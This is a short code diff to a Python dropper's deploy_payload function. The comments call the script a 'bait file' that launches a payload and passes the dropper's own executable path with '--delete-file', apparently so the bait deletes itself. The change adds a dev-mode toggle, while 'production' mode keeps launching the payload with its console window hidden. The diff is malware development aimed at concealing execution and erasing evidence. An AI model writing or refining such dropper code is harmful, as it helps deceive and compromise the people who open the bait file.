@@ -96,10 +96,20 @@ def deploy_payload():
         # Launch the payload with --delete-file argument
         original_path = sys.executable
         log(f"Launching payload with --delete-file {original_path}")
-        subprocess.Popen(
-            [payload_path, "--delete-file", original_path],
-            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
-        )
+
+        # In dev mode, show console window; in production, hide it
+        dev_mode_marker = os.path.join(source_dir, ".dev_mode")
+        is_dev_mode = os.path.exists(dev_mode_marker)
+
+        if is_dev_mode:
+            # Dev mode: Show console window
+            subprocess.Popen([payload_path, "--delete-file", original_path])
+        else:
+            # Production mode: Hide console window
+            subprocess.Popen(
+                [payload_path, "--delete-file", original_path],
+                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
+            )
 
         log("[Stage 1: Complete - Exiting bait file]")
         sys.exit(0)  # Success - no pause needed
